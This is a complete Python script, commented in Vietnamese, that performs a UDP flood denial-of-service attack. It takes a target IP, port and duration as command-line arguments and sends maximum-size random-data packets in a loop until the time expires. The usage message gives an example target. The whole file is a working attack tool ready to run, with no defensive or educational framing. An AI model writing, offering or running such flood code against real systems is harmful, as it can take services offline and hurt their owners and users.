import socket
import random
import sys
import time

def udp_flood(target_ip, target_port, duration):
    # Tạo socket UDP
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Thời gian kết thúc gửi packet flood
    end_time = time.time() + duration

    # Gửi packet flood cho đến khi hết thời gian
    while time.time() < end_time:
        # Tạo dữ liệu ngẫu nhiên cho packet
        data = random._urandom(65000)
        
        try:
            # Gửi packet tới đích
            udp_socket.sendto(data, (target_ip, target_port))
        except:
            # Nếu xảy ra lỗi, in thông báo và thoát khỏi vòng lặp
            print("Có lỗi xảy ra khi gửi packet! Vui lòng kiểm tra lại địa chỉ IP và cổng.")
            break
    
    # Đóng socket sau khi gửi xong
    udp_socket.close()
    print("Gửi packet flood hoàn tất!")

if __name__ == "__main__":
    # Kiểm tra số lượng đối số
    if len(sys.argv) != 4:
        print("Sử dụng: python udp.py <ip> <port> <thời gian>")
        print("Ví dụ: python udp.py 192.168.0.1 80 10")
        sys.exit()

    # Lấy thông tin đích từ các đối số dòng lệnh
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    # Bắt đầu gửi packet flood
    udp_flood(target_ip, target_port, duration)
